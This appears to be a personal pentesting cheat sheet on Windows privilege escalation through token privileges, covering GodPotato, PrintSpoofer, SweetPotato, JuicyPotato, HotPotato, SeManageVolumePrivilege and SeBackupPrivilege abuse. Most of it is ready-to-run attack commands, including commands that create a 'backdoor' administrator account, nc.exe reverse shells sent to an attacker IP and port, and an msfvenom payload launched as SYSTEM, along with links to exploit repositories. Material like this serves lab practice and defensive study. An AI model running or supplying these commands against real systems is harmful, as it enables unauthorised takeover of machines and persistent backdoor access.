
### SeImpersonatePrivilege

Confirm  Piv
```sh
whoami /all
```

we need the `SeImpersonatePrivilege Enabled`


**God Potato**

 https://github.com/BeichenDream/GodPotato

This is the best potato and can also be use to add an Administrator user when a shell is unstable

```
GodPotato -cmd "net user /add backdoor Password123"
GodPotato -cmd "net localgroup administrators /add backdoor"
```


**PrintSpoofer**

https://github.com/itm4n/PrintSpoofer

```
PrintSpoofer.exe -i -c powershell.exe

PrintSpoofer32.exe -i -c "nc.exe <IP> <PORT> -e cmd"
```


**SweetPotato**

 [https://github.com/carr0t2/SweetPotato/releases/tag/v1.0.0

```
.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc64.exe -a "<ip> <port> -e cmd"
```



**Juicy Potato**

1. Get a shell.exe ready from msfvenom
    
2. Use the port used in shell.exe and get CLSID from [https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
    

```
jp.exe -l 8000 -p C:\Users\Public\shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```


**Hot Potato**

```
.\potato.exe -ip <attacker ip> -cmd "C:\Path\to\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```


### SeManageVolumePrivilege

The **SeManageVolumePrivilege** in Windows allows a user to manage disk volumes, including tasks like formatting drives, creating new partitions, and assigning drive letters. While it doesn’t grant full administrative control on its own, attackers can potentially exploit it using certain tools or techniques to escalate privileges.

WriteUp 

https://medium.com/@mrlionofficial/privilege-escalation-via-semanagevolumeprivilege-2ebc0077b961

Exploit 
https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----2ebc0077b961---------------------------------------


By exploiting this vulnerability, we can escalate privileges by modifying the write permissions on **C:\ , making it writable. This allows us to perform DLL injection**, potentially gaining higher system privileges.


so i used this write up https://github.com/CsEnox/SeManageVolumeExploit



**seBackupPrivilege**

```sh
#assign a memeber
Add-LocalGroupMember -Group "Backup Operators" -Member "Noob"

```